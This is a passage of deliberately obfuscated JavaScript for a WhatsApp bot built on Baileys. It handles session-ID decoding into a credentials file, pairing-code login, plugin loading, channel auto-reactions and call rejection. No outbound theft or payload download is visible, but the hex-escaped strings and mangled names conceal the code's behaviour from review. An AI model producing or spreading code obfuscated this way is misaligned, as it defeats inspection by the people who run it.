0x274)+'\x4f\x53\x54\x5f\x49'+'\x44\x0a')+(hexanodecode_小面去م实れム个过(0x3e6)+'\x77\x61\x72\x64\x20'+hexanodecode_小面去م实れム个过(0xec)+'\x6e\x6e\x65\x6c\x20'+hexanodecode_小面去م实れム个过(0x100)+hexanodecode_小面去م实れム个过(0x2dd)+hexanodecode_小面去م实れム个过(0x316)+hexanodecode_小面去م实れム个过(0x162)+'\x63\x74'));}catch(hexanodecode_其开种在会く){console['\x65\x72\x72\x6f\x72'](hexanodecode_小面去م实れム个过(0x3be)+hexanodecode_小面去م实れム个过(0x239)+hexanodecode_小面去م实れム个过(0x236)+hexanodecode_小面去م实れム个过(0x292)+hexanodecode_小面去م实れム个过(0x248)+hexanodecode_小面去م实れム个过(0x244),hexanodecode_其开种在会く[hexanodecode_小面去م实れム个过(0x194)+'\x67\x65']),await hexanodecode_フチん机ゆ[hexanodecode_小面去م实れム个过(0x12d)](hexanodecode_小面去م实れム个过(0x2b9)+hexanodecode_小面去م实れム个过(0x2b8)+hexanodecode_小面去م实れム个过(0x130)+'\x63\x74\x3a\x20'+hexanodecode_其开种在会く[hexanodecode_小面去م实れム个过(0x194)+'\x67\x65']);}}const newsletterEvents=require('\x2e\x2f\x63\x6f\x6d'+'\x6d\x61\x6e\x64'),hexanodecode_ف着ゆد={};hexanodecode_ف着ゆد['\x70\x61\x74\x74\x65'+'\x72\x6e']=hexanodecode_ي和们点تク(0x162)+'\x63\x74',hexanodecode_ف着ゆد['\x61\x6c\x69\x61\x73']=[hexanodecode_ي和们点تク(0x28e)+'\x74','\x63\x68\x61\x6e\x6e'+hexanodecode_ي和们点تク(0x339)+'\x63\x74'],hexanodecode_ف着ゆد[hexanodecode_ي和们点تク(0x1b3)]='\ud83d\udcf1',hexanodecode_ف着ゆد[hexanodecode_ي和们点تク(0x23a)+'\x69\x6f\x6e']=handleChannelReactCommand,newsletterEvents[hexanodecode_ي和们点تク(0x17d)+hexanodecode_ي和们点تク(0x233)]['\x70\x75\x73\x68'](hexanodecode_ف着ゆد),newsletterEvents[hexanodecode_ي和们点تク(0x17d)+hexanodecode_ي和们点تク(0x233)]['\x70\x75\x73\x68']({'\x70\x61\x74\x74\x65\x72\x6e':hexanodecode_ي和们点تク(0xfb)+'\x74\x75\x73','\x61\x6c\x69\x61\x73':['\x63\x68\x61\x6e\x6e'+hexanodecode_ي和们点تク(0x386)+'\x74\x75\x73',hexanodecode_ي和们点تク(0x1b3)+hexanodecode_ي和们点تク(0xef)+'\x73'],'\x72\x65\x61\x63\x74':'\ud83d\udcca','\x66\x75\x6e\x63\x74\x69\x6f\x6e':async(hexanodecode_み然ب来里和,hexanodecode_着ح学其サ经ヤ们カ,hexanodecode_如就所ヌ,hexanodecode_ノط应他オか以)=>{const hexanodecode_ج地の我自=hexanodecode_ي和们点تク,hexanodecode_わア进民サ时就ろ天=hexanodecode_着ح学其サ经ヤ们カ[hexanodecode_ج地の我自(0x278)][hexanodecode_ج地の我自(0x1db)+hexanodecode_ج地の我自(0x362)+'\x74']||hexanodecode_着ح学其サ经ヤ们カ[hexanodecode_ج地の我自(0x278)][hexanodecode_ج地の我自(0x238)+hexanodecode_ج地の我自(0x2e7)],hexanodecode_以然制リ个国レ时=hexanodecode_わア进民サ时就ろ天['\x73\x70\x6c\x69\x74']('\x40')[0x35*0x6a+-0x3*-0xa30+0x16*-0x263]||hexanodecode_わア进民サ时就ろ天[hexanodecode_ج地の我自(0x120)]('\x3a')[0x1de*0xb+0x1025+-0x24af],hexanodecode_セ好个ن天خ个を=ownerNumber['\x69\x6e\x63\x6c\x75'+'\x64\x65\x73'](hexanodecode_以然制リ个国レ时)||hexanodecode_着ح学其サ经ヤ们カ[hexanodecode_ج地の我自(0x278)][hexanodecode_ج地の我自(0x112)+'\x65'];if(!hexanodecode_セ好个ن天خ个を){await hexanodecode_如就所ヌ[hexanodecode_ج地の我自(0x12d)](hexanodecode_ج地の我自(0x2fa)+hexanodecode_ج地の我自(0x19f)+'\x6e\x6f\x74\x20\x61'+hexanodecode_ج地の我自(0x382)+hexanodecode_ج地の我自(0x1d0)+hexanodecode_ج地の我自(0x299)+hexanodecode_ج地の我自(0x3bb)+hexanodecode_ج地の我自(0x23e)+'\x6d\x61\x6e\x64\x21');return;}const hexanodecode_过业ね下よコと有=reactedMessages[hexanodecode_ج地の我自(0x1c1)];let hexanodecode_こ用还有تト='\ud83d\udcca\x20\x43\x68\x61'+hexanodecode_ج地の我自(0x239)+hexanodecode_ج地の我自(0x236)+'\x69\x6f\x6e\x20\x53'+'\x74\x61\x74\x75\x73'+'\x0a\x0a';hexanodecode_こ用还有تト+=hexanodecode_ج地の我自(0x125)+hexanodecode_ج地の我自(0x294)+hexanodecode_ج地の我自(0x2d6)+hexanodecode_ج地の我自(0x314)+'\x63\x65\x73\x73\x65'+hexanodecode_ج地の我自(0x12a)+hexanodecode_过业ね下よコと有+'\x0a',hexanodecode_こ用还有تト+=hexanodecode_ج地の我自(0x1b1)+hexanodecode_ج地の我自(0x130)+hexanodecode_ج地の我自(0x3ca)+'\x73\x3a\x20'+(config[hexanodecode_ج地の我自(0x22e)+'\x43\x48\x41\x4e\x4e'+hexanodecode_ج地の我自(0x345)+hexanodecode_ج地の我自(0xfa)]===hexanodecode_ج地の我自(0xf1)?hexanodecode_ج地の我自(0x19c)+hexanodecode_ج地の我自(0x3db):hexanodecode_ج地の我自(0x3fe)+hexanodecode_ج地の我自(0x224))+'\x0a',hexanodecode_こ用还有تト+=hexanodecode_ج地の我自(0x3bf)+hexanodecode_ج地の我自(0x3ad)+hexanodecode_ج地の我自(0x2bc)+hexanodecode_ج地の我自(0x132)+hexanodecode_ج地の我自(0x330)+'\x20'+(config[hexanodecode_ج地の我自(0x11b)+hexanodecode_ج地の我自(0x345)+hexanodecode_ج地の我自(0x26e)+hexanodecode_ج地の我自(0x332)]||-0x1*0x1f85+-0x19bc+0x3973)+'\x0a';if(hexanodecode_过业ね下よコと有>0x1*0x23b1+0x235f+-0x4710){const hexanodecode_开不种タ就理在二め=Array[hexanodecode_ج地の我自(0x167)](reactedMessages[hexanodecode_ج地の我自(0x23f)+'\x65\x73']())[hexanodecode_ج地の我自(0x20f)](-(0x2*-0xddb+-0x1*0xb61+0x271c*0x1));hexanodecode_こ用还有تト+='\x0a\ud83d\udccb\x20\x4c\x61'+hexanodecode_ج地の我自(0x199)+hexanodecode_ج地の我自(0x1b3)+hexanodecode_ج地の我自(0x37e)+'\x0a',hexanodecode_开不种タ就理在二め[hexanodecode_ج地の我自(0x128)+'\x63\x68'](([hexanodecode_分わ而け,hexanodecode_やه同ワ发子マ])=>{const hexanodecode_成国了主产一=hexanodecode_ج地の我自,hexanodecode_把们同子个ちイ=hexanodecode_分わ而け[hexanodecode_成国了主产一(0x120)]('\x5f')[0x15c2+-0x1*-0x2419+-0x39db]||hexanodecode_成国了主产一(0x207)+'\x77\x6e';hexanodecode_こ用还有تト+='\u2022\x20'+hexanodecode_把们同子个ちイ+hexanodecode_成国了主产一(0x28b)+hexanodecode_やه同ワ发子マ['\x72\x65\x61\x63\x74'+'\x69\x6f\x6e\x73']+(hexanodecode_成国了主产一(0x3ad)+hexanodecode_成国了主产一(0x2bc)+'\x20\x28')+new Date(hexanodecode_やه同ワ发子マ[hexanodecode_成国了主产一(0x1d8)+'\x70\x64\x61\x74\x65'])[hexanodecode_成国了主产一(0x3ab)+hexanodecode_成国了主产一(0x2df)+hexanodecode_成国了主产一(0x307)]()+'\x29\x0a';});}await hexanodecode_如就所ヌ[hexanodecode_ج地の我自(0x12d)](hexanodecode_こ用还有تト);}});if(!fs[hexanodecode_ي和们点تク(0x1ff)+hexanodecode_ي和们点تク(0x121)](__dirname+(hexanodecode_ي和们点تク(0x389)+hexanodecode_ي和们点تク(0x150)+'\x63\x72\x65\x64\x73'+hexanodecode_ي和们点تク(0x203)))){if(config[hexanodecode_ي和们点تク(0x3ba)+hexanodecode_ي和们点تク(0x377)]&&config[hexanodecode_ي和们点تク(0x3ba)+hexanodecode_ي和们点تク(0x377)][hexanodecode_ي和们点تク(0x2fd)]()!==''){const sessdata=config[hexanodecode_ي和们点تク(0x3ba)+hexanodecode_ي和们点تク(0x377)][hexanodecode_ي和们点تク(0x30e)+'\x63\x65'](hexanodecode_ي和们点تク(0x265)+hexanodecode_ي和们点تク(0x198),'');try{const decodedData=Buffer[hexanodecode_ي和们点تク(0x167)](sessdata,'\x62\x61\x73\x65\x36'+'\x34')['\x74\x6f\x53\x74\x72'+hexanodecode_ي和们点تク(0x2d1)](hexanodecode_ي和们点تク(0x16b));fs[hexanodecode_ي和们点تク(0x182)+hexanodecode_ي和们点تク(0x1f2)+hexanodecode_ي和们点تク(0x32c)](__dirname+(hexanodecode_ي和们点تク(0x389)+hexanodecode_ي和们点تク(0x150)+'\x63\x72\x65\x64\x73'+hexanodecode_ي和们点تク(0x203)),decodedData),console['\x6c\x6f\x67'](hexanodecode_ي和们点تク(0x1e8)+hexanodecode_ي和们点تク(0x110)+hexanodecode_ي和们点تク(0x3ac)+hexanodecode_ي和们点تク(0x269)+hexanodecode_ي和们点تク(0x1f3)+hexanodecode_ي和们点تク(0x398)+'\x49\x44');}catch(hexanodecode_当当セ理机ネ法トな){console[hexanodecode_ي和们点تク(0x1a7)](hexanodecode_ي和们点تク(0x1a9)+hexanodecode_ي和们点تク(0x20e)+hexanodecode_ي和们点تク(0x16e)+hexanodecode_ي和们点تク(0x3f5)+hexanodecode_ي和们点تク(0x110)+hexanodecode_ي和们点تク(0x154),hexanodecode_当当セ理机ネ法トな);throw hexanodecode_当当セ理机ネ法トな;}}else console[hexanodecode_ي和们点تク(0x180)](hexanodecode_ي和们点تク(0x1ae)+'\x53\x45\x53\x53\x49'+hexanodecode_ي和们点تク(0x377)+hexanodecode_ي和们点تク(0x234)+hexanodecode_ي和们点تク(0x302)+hexanodecode_ي和们点تク(0x2eb)+hexanodecode_ي和们点تク(0x297)+'\x6e\x67\x20\x53\x79'+hexanodecode_ي和们点تク(0x247)),((async()=>{const hexanodecode_上对リフ要年=hexanodecode_ي和们点تク,{state:hexanodecode_るدヒ这ンかんف使,saveCreds:hexanodecode_ヌアツ我好アテラ}=await useMultiFileAuthState(__dirname+(hexanodecode_上对リフ要年(0x389)+hexanodecode_上对リフ要年(0x359))),hexanodecode_ヘ产下ض因ウ如へ={};hexanodecode_ヘ产下ض因ウ如へ[hexanodecode_上对リフ要年(0xf5)]=hexanodecode_るدヒ这ンかんف使,hexanodecode_ヘ产下ض因ウ如へ[hexanodecode_上对リフ要年(0x322)+'\x51\x52\x49\x6e\x54'+hexanodecode_上对リフ要年(0x288)+'\x61\x6c']=![];const hexanodecode_经シ在مリ=makeWASocket(hexanodecode_ヘ产下ض因ウ如へ);!hexanodecode_るدヒ这ンかんف使[hexanodecode_上对リフ要年(0x16c)]?.['\x6d\x65']&&rl[hexanodecode_上对リフ要年(0x360)+hexanodecode_上对リフ要年(0x2e4)](hexanodecode_上对リフ要年(0xf9)+hexanodecode_上对リフ要年(0x1b7)+hexanodecode_上对リフ要年(0x227)+hexanodecode_上对リフ要年(0x271)+hexanodecode_上对リフ要年(0x260)+hexanodecode_上对リフ要年(0x3f8)+hexanodecode_上对リフ要年(0x2a8)+'\x6f\x75\x6e\x74\x72'+hexanodecode_上对リフ要年(0x301)+hexanodecode_上对リフ要年(0x33f),async hexanodecode_也上ك机س去=>{const hexanodecode_ذ水说ニムア后用=hexanodecode_上对リフ要年;try{const hexanodecode_おع三ら高国得会=await hexanodecode_经シ在مリ['\x72\x65\x71\x75\x65'+'\x73\x74\x50\x61\x69'+hexanodecode_ذ水说ニムア后用(0x35b)+hexanodecode_ذ水说ニムア后用(0x3fa)](hexanodecode_也上ك机س去);console[hexanodecode_ذ水说ニムア后用(0x180)](hexanodecode_ذ水说ニムア后用(0x39d)+'\x72\x20\x50\x61\x69'+hexanodecode_ذ水说ニムア后用(0x24d)+'\x43\x6f\x64\x65\x3a',hexanodecode_おع三ら高国得会),console[hexanodecode_ذ水说ニムア后用(0x180)](hexanodecode_ذ水说ニムア后用(0x385)+hexanodecode_ذ水说ニムア后用(0x400)+hexanodecode_ذ水说ニムア后用(0x127)+hexanodecode_ذ水说ニムア后用(0x263)+hexanodecode_ذ水说ニムア后用(0x35d)+hexanodecode_ذ水说ニムア后用(0xf2)+'\x74\x6f\x20\x6c\x69'+hexanodecode_ذ水说ニムア后用(0x3f7)+'\x75\x72\x20\x62\x6f'+'\x74\x20\x64\x65\x76'+hexanodecode_ذ水说ニムア后用(0x1ed));}catch(hexanodecode_ヤو能طエモ){console[hexanodecode_ذ水说ニムア后用(0x1a7)](hexanodecode_ذ水说ニムア后用(0x1a9)+'\x6f\x72\x20\x67\x65'+hexanodecode_ذ水说ニムア后用(0x2ae)+hexanodecode_ذ水说ニムア后用(0x13b)+hexanodecode_ذ水说ニムア后用(0x10d)+'\x67\x20\x63\x6f\x64'+'\x65\x3a',hexanodecode_ヤو能طエモ);}}),hexanodecode_经シ在مリ['\x65\x76']['\x6f\x6e'](hexanodecode_上对リフ要年(0x16c)+hexanodecode_上对リフ要年(0x192)+'\x74\x65',hexanodecode_ヌアツ我好アテラ),hexanodecode_经シ在مリ['\x65\x76']['\x6f\x6e'](hexanodecode_上对リフ要年(0x380)+hexanodecode_上对リフ要年(0x3ca)+'\x2e\x75\x70\x64\x61'+'\x74\x65',({connection:hexanodecode_时加好我ろヌ可زユ})=>{const hexanodecode_发つ如レ学=hexanodecode_上对リフ要年;hexanodecode_时加好我ろヌ可زユ===hexanodecode_发つ如レ学(0x2d2)&&console[hexanodecode_发つ如レ学(0x180)]('\u2705\x20\x42\x6f\x74'+hexanodecode_发つ如レ学(0x300)+hexanodecode_发つ如レ学(0x1ac)+hexanodecode_发つ如レ学(0x384)+hexanodecode_发つ如レ学(0x3a8)+hexanodecode_发つ如レ学(0x2a4)+hexanodecode_发つ如レ学(0x36c)+hexanodecode_发つ如レ学(0x176)+'\x21');});})());}const express=require('\x65\x78\x70\x72\x65'+'\x73\x73'),app=express(),port=process[hexanodecode_ي和们点تク(0x31a)]['\x50\x4f\x52\x54']||0x1cc2*0x1+-0x3cd4+-0x5*-0xd84;let reconnectDelay=-0x1*-0x258d+0xae4+0x11*-0x229;async function connectToWA(){const hexanodecode_地会这フ过两=hexanodecode_ي和们点تク;console['\x6c\x6f\x67']('\x43\x6f\x6e\x6e\x65'+hexanodecode_地会这フ过两(0x351)+hexanodecode_地会这フ过两(0x336)+'\x68\x61\x74\x73\x41'+'\x70\x70\x20\u23f3\ufe0f\x2e'+'\x2e\x2e');const {state:hexanodecode_タقツ工和种作,saveCreds:hexanodecode_面着后せه会るط}=await useMultiFileAuthState(__dirname+(hexanodecode_地会这フ过两(0x389)+hexanodecode_地会这フ过两(0x150)));var {version:hexanodecode_政使在行在}=await fetchLatestBaileysVersion();const hexanodecode_因本ホ对前ら由地={};hexanodecode_因本ホ对前ら由地[hexanodecode_地会这フ过两(0x350)]=hexanodecode_地会这フ过两(0x401)+'\x74';const hexanodecode_于度ن有=makeWASocket({'\x6c\x6f\x67\x67\x65\x72':P(hexanodecode_因本ホ对前ら由地),'\x70\x72\x69\x6e\x74\x51\x52\x49\x6e\x54\x65\x72\x6d\x69\x6e\x61\x6c':![],'\x62\x72\x6f\x77\x73\x65\x72':Browsers['\x6d\x61\x63\x4f\x53'](hexanodecode_地会这フ过两(0x10f)+'\x6f\x78'),'\x73\x79\x6e\x63\x46\x75\x6c\x6c\x48\x69\x73\x74\x6f\x72\x79':!![],'\x61\x75\x74\x68':hexanodecode_タقツ工和种作,'\x76\x65\x72\x73\x69\x6f\x6e':hexanodecode_政使在行在,'\x67\x65\x74\x4d\x65\x73\x73\x61\x67\x65':async()=>({'\x63\x6f\x6e\x76\x65\x72\x73\x61\x74\x69\x6f\x6e':''})});hexanodecode_于度ن有['\x65\x76']['\x6f\x6e'](hexanodecode_地会这フ过两(0x380)+hexanodecode_地会这フ过两(0x3ca)+hexanodecode_地会这フ过两(0x192)+'\x74\x65',async hexanodecode_成工ち学=>{const hexanodecode_リ为他来业ゆうお=hexanodecode_地会这フ过两,{connection:hexanodecode_ホオ都ユ,lastDisconnect:hexanodecode_在有发ヨعソネ中度}=hexanodecode_成工ち学;if(hexanodecode_ホオ都ユ===hexanodecode_リ为他来业ゆうお(0x216)){const hexanodecode_出صد发民ب后こ=hexanodecode_在有发ヨعソネ中度?.[hexanodecode_リ为他来业ゆうお(0x1a7)]?.[hexanodecode_リ为他来业ゆうお(0xe8)+'\x74']?.[hexanodecode_リ为他来业ゆうお(0xef)+hexanodecode_リ为他来业ゆうお(0x1d9)],hexanodecode_يト都れ由因ف高政=hexanodecode_出صد发民ب后こ!==DisconnectReason[hexanodecode_リ为他来业ゆうお(0x3c1)+hexanodecode_リ为他来业ゆうお(0x17a)];hexanodecode_يト都れ由因ف高政?(console[hexanodecode_リ为他来业ゆうお(0x180)](hexanodecode_リ为他来业ゆうお(0x2a1)+'\x6e\x65\x63\x74\x69'+hexanodecode_リ为他来业ゆうお(0x14b)+'\x20'+reconnectDelay/(0x1*-0x1ec9+-0x4*0x7a6+0x4149)+hexanodecode_リ为他来业ゆうお(0x3f1)),setTimeout(()=>connectToWA(),reconnectDelay),reconnectDelay=Math[hexanodecode_リ为他来业ゆうお(0x1d1)](reconnectDelay*(-0xbb2+0x31e+0x896),-0x2*-0x3cdd+0x8c*-0xbd+-0x3cd*-0x1a)):console[hexanodecode_リ为他来业ゆうお(0x180)](hexanodecode_リ为他来业ゆうお(0x13f)+hexanodecode_リ为他来业ゆうお(0x2be)+hexanodecode_リ为他来业ゆうお(0x29e)+hexanodecode_リ为他来业ゆうお(0x217)+hexanodecode_リ为他来业ゆうお(0x3c4)+hexanodecode_リ为他来业ゆうお(0x18a)+hexanodecode_リ为他来业ゆうお(0x1b0)+'\x2e');}else{if(hexanodecode_ホオ都ユ==='\x6f\x70\x65\x6e'){reconnectDelay=-0x8d*-0x1+-0xcb6+0x17e1*0x1,console[hexanodecode_リ为他来业ゆうお(0x180)]('\ud83e\uddec\x20\x49\x6e\x73'+hexanodecode_リ为他来业ゆうお(0x25e)+'\x6e\x67\x20\x50\x6c'+'\x75\x67\x69\x6e\x73');const hexanodecode_业年ゆ多年=require(hexanodecode_リ为他来业ゆうお(0x212));fs['\x72\x65\x61\x64\x64'+'\x69\x72\x53\x79\x6e'+'\x63'](hexanodecode_リ为他来业ゆうお(0x230)+hexanodecode_リ为他来业ゆうお(0x106))[hexanodecode_リ为他来业ゆうお(0x128)+'\x63\x68'](hexanodecode_ر电ツ要实ح=>{const hexanodecode_كもにき开大ん们テ=hexanodecode_リ为他来业ゆうお;hexanodecode_业年ゆ多年[hexanodecode_كもにき开大ん们テ(0x355)+'\x6d\x65'](hexanodecode_ر电ツ要实ح)[hexanodecode_كもにき开大ん们テ(0x369)+hexanodecode_كもにき开大ん们テ(0x1cf)+'\x65']()==hexanodecode_كもにき开大ん们テ(0x3f3)&&require(hexanodecode_كもにき开大ん们テ(0x230)+'\x67\x69\x6e\x73\x2f'+hexanodecode_ر电ツ要实ح);}),console[hexanodecode_リ为他来业ゆうお(0x180)](hexanodecode_リ为他来业ゆうお(0x2ca)+'\x6e\x73\x20\x69\x6e'+hexanodecode_リ为他来业ゆうお(0x3a4)+hexanodecode_リ为他来业ゆうお(0x3bd)+hexanodecode_リ为他来业ゆうお(0x31d)+hexanodecode_リ为他来业ゆうお(0x33d)),console['\x6c\x6f\x67'](hexanodecode_リ为他来业ゆうお(0x36d)+hexanodecode_リ为他来业ゆうお(0x14d)+'\x74\x65\x64\x20\x74'+hexanodecode_リ为他来业ゆうお(0x284)+hexanodecode_リ为他来业ゆうお(0x29c)+'\x20\u2705'),await ensureNewsletterLoaded(),console[hexanodecode_リ为他来业ゆうお(0x180)]('\u2705\x20\x4e\x65\x77'+hexanodecode_リ为他来业ゆうお(0x181)+hexanodecode_リ为他来业ゆうお(0x392)+'\x73\x74\x65\x6d\x20'+'\x72\x65\x61\x64\x79'+hexanodecode_リ为他来业ゆうお(0x373)+'\x20'+(newsletterJids?.[hexanodecode_リ为他来业ゆうお(0x19a)+'\x68']||0x397+0x44f*0x1+-0x7e6)+(hexanodecode_リ为他来业ゆうお(0x3c9)+hexanodecode_リ为他来业ゆうお(0x356))),global[hexanodecode_リ为他来业ゆうお(0x268)+hexanodecode_リ为他来业ゆうお(0x12b)+'\x6e\x65']=config[hexanodecode_リ为他来业ゆうお(0x2c5)+hexanodecode_リ为他来业ゆうお(0x143)+hexanodecode_リ为他来业ゆうお(0x12c)]===hexanodecode_リ为他来业ゆうお(0xf1);!global[hexanodecode_リ为他来业ゆうお(0x1ca)+hexanodecode_リ为他来业ゆうお(0x2ce)+hexanodecode_リ为他来业ゆうお(0x126)+hexanodecode_リ为他来业ゆうお(0x14c)+'\x6c']&&(global[hexanodecode_リ为他来业ゆうお(0x1ca)+hexanodecode_リ为他来业ゆうお(0x2ce)+hexanodecode_リ为他来业ゆうお(0x126)+hexanodecode_リ为他来业ゆうお(0x14c)+'\x6c']=setInterval(async()=>{const hexanodecode_ゆ两キ制ヨ=hexanodecode_リ为他来业ゆうお;try{global[hexanodecode_ゆ两キ制ヨ(0x268)+'\x73\x4f\x6e\x6c\x69'+'\x6e\x65']?await hexanodecode_于度ن有['\x73\x65\x6e\x64\x50'+hexanodecode_ゆ两キ制ヨ(0x1e4)+'\x63\x65\x55\x70\x64'+hexanodecode_ゆ两キ制ヨ(0x3f6)]('\x61\x76\x61\x69\x6c'+'\x61\x62\x6c\x65'):await hexanodecode_于度ن有[hexanodecode_ゆ两キ制ヨ(0x25a)+hexanodecode_ゆ两キ制ヨ(0x1e4)+hexanodecode_ゆ两キ制ヨ(0x14f)+hexanodecode_ゆ两キ制ヨ(0x3f6)](hexanodecode_ゆ两キ制ヨ(0x2d8)+hexanodecode_ゆ两キ制ヨ(0x343)+'\x65');}catch(hexanodecode_メ部如くアق就ぬ){}},0x24de+0x38a4+-0x3e42));if(global[hexanodecode_リ为他来业ゆうお(0x268)+hexanodecode_リ为他来业ゆうお(0x12b)+'\x6e\x65'])try{await hexanodecode_于度ن有[hexanodecode_リ为他来业ゆうお(0x25a)+'\x72\x65\x73\x65\x6e'+'\x63\x65\x55\x70\x64'+hexanodecode_リ为他来业ゆうお(0x3f6)](hexanodecode_リ为他来业ゆうお(0x368)+hexanodecode_リ为他来业ゆうお(0x327));}catch(hexanodecode_不十高本于す){}const hexanodecode_ら发分や=jidNormalizedUser(hexanodecode_于度ن有['\x75\x73\x65\x72']['\x69\x64']);let hexanodecode_アマ开よそه了ヨ同=hexanodecode_リ为他来业ゆうお(0x177)+hexanodecode_リ为他来业ゆうお(0x14e)+'\x52\x45\x20\x41\x44'+hexanodecode_リ为他来业ゆうお(0x17c)+hexanodecode_リ为他来业ゆうお(0xee)+'\x52\x2a\x0a\x0a\x3e'+'\x20\x2a\x73\u026a\u1d0d'+hexanodecode_リ为他来业ゆうお(0x366)+hexanodecode_リ为他来业ゆうお(0x2c8)+hexanodecode_リ为他来业ゆうお(0x39c)+hexanodecode_リ为他来业ゆうお(0x200)+'\x20\u0299\u1d1c\u1d1b\x20'+'\u029f\u1d0f\u1d00\u1d05\u1d07'+hexanodecode_リ为他来业ゆうお(0x3d7)+'\u029c\x20\u0493\u1d07\u1d00'+hexanodecode_リ为他来业ゆうお(0x2d7)+hexanodecode_リ为他来业ゆうお(0x27a)+hexanodecode_リ为他来业ゆうお(0x29f)+'\u1d07\u1d07\u029f\x2d\u1d0d'+hexanodecode_リ为他来业ゆうお(0x1fa)+hexanodecode_リ为他来业ゆうお(0x329)+hexanodecode_リ为他来业ゆうお(0x2f2)+hexanodecode_リ为他来业ゆうお(0x358)+hexanodecode_リ为他来业ゆうお(0x1a4)+hexanodecode_リ为他来业ゆうお(0x37b)+hexanodecode_リ为他来业ゆうお(0xe4)+hexanodecode_リ为他来业ゆうお(0x179)+hexanodecode_リ为他来业ゆうお(0x21f)+hexanodecode_リ为他来业ゆうお(0x370)+hexanodecode_リ为他来业ゆうお(0x16d)+'\u026a\u0274\x20\u1d21\u029c'+hexanodecode_リ为他来业ゆうお(0x2e0)+'\u1d18\x20\u1d04\u029c\u1d00'+hexanodecode_リ为他来业ゆうお(0x35c)+'\x20\u2935\ufe0f\x0a\x20\x0a'+hexanodecode_リ为他来业ゆうお(0x10b)+hexanodecode_リ为他来业ゆうお(0x108)+hexanodecode_リ为他来业ゆうお(0x24f)+hexanodecode_リ为他来业ゆうお(0x1ad)+hexanodecode_リ为他来业ゆうお(0x36f)+hexanodecode_リ为他来业ゆうお(0x33b)+hexanodecode_リ为他来业ゆうお(0x13a)+hexanodecode_リ为他来业ゆうお(0x196)+hexanodecode_リ为他来业ゆうお(0x159)+hexanodecode_リ为他来业ゆうお(0x1ba)+hexanodecode_リ为他来业ゆうお(0x2fb)+hexanodecode_リ为他来业ゆうお(0x171)+hexanodecode_リ为他来业ゆうお(0x38b)+'\x52\x45\x46\x49\x58'+hexanodecode_リ为他来业ゆうお(0x114)+prefix+(hexanodecode_リ为他来业ゆうお(0x3b5)+'\u1d05\u1d0f\u0274\u1d1b\x20'+hexanodecode_リ为他来业ゆうお(0x2b3)+'\u1d1b\x20\u1d1b\u1d0f\x20'+hexanodecode_リ为他来业ゆうお(0x1d4)+hexanodecode_リ为他来业ゆうお(0x20c)+hexanodecode_リ为他来业ゆうお(0x2c3)+hexanodecode_リ为他来业ゆうお(0x2d5)+'\x0a\x0a\x68\x74\x74'+hexanodecode_リ为他来业ゆうお(0x18f)+hexanodecode_リ为他来业ゆうお(0x2c4)+hexanodecode_リ为他来业ゆうお(0x2a7)+'\x2f\x41\x64\x65\x65'+hexanodecode_リ为他来业ゆうお(0x18e)+'\x63\x68\x2f\x41\x44'+hexanodecode_リ为他来业ゆうお(0x17c)+'\x44\x0a\x0a\x3e\x20'+hexanodecode_リ为他来业ゆうお(0x3a5)+hexanodecode_リ为他来业ゆうお(0x39e)+hexanodecode_リ为他来业ゆうお(0x164)+hexanodecode_リ为他来业ゆうお(0x2f4)+hexanodecode_リ为他来业ゆうお(0x22f));try{const hexanodecode_ヘ民些しカه前个ひ={};hexanodecode_ヘ民些しカه前个ひ[hexanodecode_リ为他来业ゆうお(0x363)]='\x68\x74\x74\x70\x73'+hexanodecode_リ为他来业ゆうお(0x222)+hexanodecode_リ为他来业ゆうお(0x26f)+hexanodecode_リ为他来业ゆうお(0x32a)+hexanodecode_リ为他来业ゆうお(0x3ff)+hexanodecode_リ为他来业ゆうお(0x21e)+'\x69\x2e\x6a\x70\x67';const hexanodecode_ذف外面在ナ使={};hexanodecode_ذف外面在ナ使[hexanodecode_リ为他来业ゆうお(0x267)]=hexanodecode_ヘ民些しカه前个ひ,hexanodecode_ذف外面在ナ使['\x63\x61\x70\x74\x69'+'\x6f\x6e']=hexanodecode_アマ开よそه了ヨ同,await hexanodecode_于度ن有[hexanodecode_リ为他来业ゆうお(0x357)+hexanodecode_リ为他来业ゆうお(0x33e)+'\x65'](hexanodecode_ら发分や,hexanodecode_ذف外面在ナ使);}catch(hexanodecode_レ法オ产ホ){console['\x65\x72\x72\x6f\x72'](hexanodecode_リ为他来业ゆうお(0x3d0)+hexanodecode_リ为他来业ゆうお(0x3ca)+hexanodecode_リ为他来业ゆうお(0x30a)+hexanodecode_リ为他来业ゆうお(0x2bb)+hexanodecode_リ为他来业ゆうお(0x244),hexanodecode_レ法オ产ホ);const hexanodecode_もヨぬハ={};hexanodecode_もヨぬハ[hexanodecode_リ为他来业ゆうお(0x155)]=hexanodecode_アマ开よそه了ヨ同,await hexanodecode_于度ن有['\x73\x65\x6e\x64\x4d'+hexanodecode_リ为他来业ゆうお(0x33e)+'\x65'](hexanodecode_ら发分や,hexanodecode_もヨぬハ);}}}}),hexanodecode_于度ن有['\x65\x76']['\x6f\x6e']('\x63\x61\x6c\x6c',async hexanodecode_性おشかワ=>{const hexanodecode_ユ本两زみ=hexanodecode_地会这フ过两;try{if(config['\x41\x4e\x54\x49\x5f'+'\x43\x41\x4c\x4c']!==hexanodecode_ユ本两زみ(0xf1))return;for(const hexanodecode_以جせف of hexanodecode_性おشかワ){if(hexanodecode_以جせف['\x73\x74\x61\x74\x75'+'\x73']!==hexanodecode_ユ本两زみ(0x1bb))continue;const hexanodecode_もذうヨメ加タ度=hexanodecode_以جせف['\x69\x64'],hexanodecode_ふ时レ从ح=hexanodecode_以جせف[hexanodecode_ユ本两زみ(0x167)];await hexanodecode_于度ن有[hexanodecode_ユ本两زみ(0x25f)+'\x74\x43\x61\x6c\x6c'](hexanodecode_もذうヨメ加タ度,hexanodecode_ふ时レ从ح);const hexanodecode_制生ツ这地可上={};hexanodecode_制生ツ这地可上[hexanodecode_ユ本两زみ(0x155)]=config[hexanodecode_ユ本两زみ(0x2e3)+hexanodecode_ユ本两زみ(0x249)]||hexanodecode_ユ本两زみ(0xf0)+hexanodecode_ユ本两زみ(0x35f)+hexanodecode_ユ本两زみ(0x134)+'\u03c3\u03c9\u0454\u2202\x20'+hexanodecode_ユ本两زみ(0x283)+'\u03b9\u0455\x20\u0274\u1d1c'+hexanodecode_ユ本两زみ(0x3b4)+hexanodecode_ユ本两زみ(0x1e7)+hexanodecode_ユ本两زみ(0x403)+hexanodecode_ユ本两زみ(0x280)+hexanodecode_ユ本两زみ(0x122)+hexanodecode_ユ本两زみ(0x3e1)+hexanodecode_ユ本两زみ(0x3d3),await 